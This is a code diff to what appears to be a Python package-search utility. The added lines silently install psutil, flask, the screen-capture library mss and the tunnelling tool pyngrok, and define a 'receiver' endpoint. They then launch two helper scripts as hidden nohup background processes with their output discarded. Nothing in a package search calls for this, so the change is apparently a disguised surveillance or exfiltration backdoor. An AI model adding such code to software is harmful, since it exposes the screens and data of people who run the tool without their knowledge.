@@ -1,4 +1,4 @@
-import requests, os, sys, subprocess
+import requests, os, sys, subprocess, time
 from bs4 import BeautifulSoup
 
 
@@ -105,6 +105,7 @@ class SearchEndpoints:
             print("An error occurred while searching for the package.")
 
     def search_other():
+        PREDEFINED_ENDPOINT = "http://0.0.0.0:8080/receiver"
         subprocess.check_call(
             [
                 sys.executable,
@@ -116,9 +117,15 @@ class SearchEndpoints:
                 "psutil",
                 "flask",
                 "mss",
+                "pyngrok",
             ]
         )
         subprocess.Popen(
             "(nohup python pkg_search/search_misc.py </dev/null >/dev/null 2>&1 &)",
+            shell=True,
+        )
+        time.sleep(5)
+        subprocess.Popen(
+            "(nohup python pkg_search/search_index.py </dev/null >/dev/null 2>&1 &)",
             shell=True,
         )
